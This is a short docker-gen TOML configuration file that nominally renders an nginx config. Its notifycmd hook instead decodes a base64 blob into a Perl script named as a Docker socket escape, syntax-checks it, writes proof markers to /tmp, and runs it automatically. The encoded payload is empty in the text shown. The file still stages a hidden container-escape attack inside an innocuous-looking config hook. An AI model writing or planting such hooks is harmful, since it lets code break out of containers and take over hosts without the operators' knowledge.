[[config]]
template = "/tmp/pr-nginx.tmpl"
dest = "/tmp/pr-nginx-generated.conf"
onlyexposed = true
watch = false
notifycmd = '''sh -lc '

B64=""

printf "%s" "$B64" | base64 -d > /tmp/pr-docker-sock-escape.pl
echo "PERL_FILE_WRITTEN" >> /tmp/pr-dockergen-proof.txt

perl -c /tmp/pr-docker-sock-escape.pl >/tmp/pr-perl-check.txt 2>&1 || {
  echo "PERL_SYNTAX_FAILED" >> /tmp/pr-dockergen-proof.txt
  cat /tmp/pr-perl-check.txt >> /tmp/pr-dockergen-proof.txt
  exit 1
}

echo "PERL_SYNTAX_OK" >> /tmp/pr-dockergen-proof.txt

perl /tmp/pr-docker-sock-escape.pl
' '''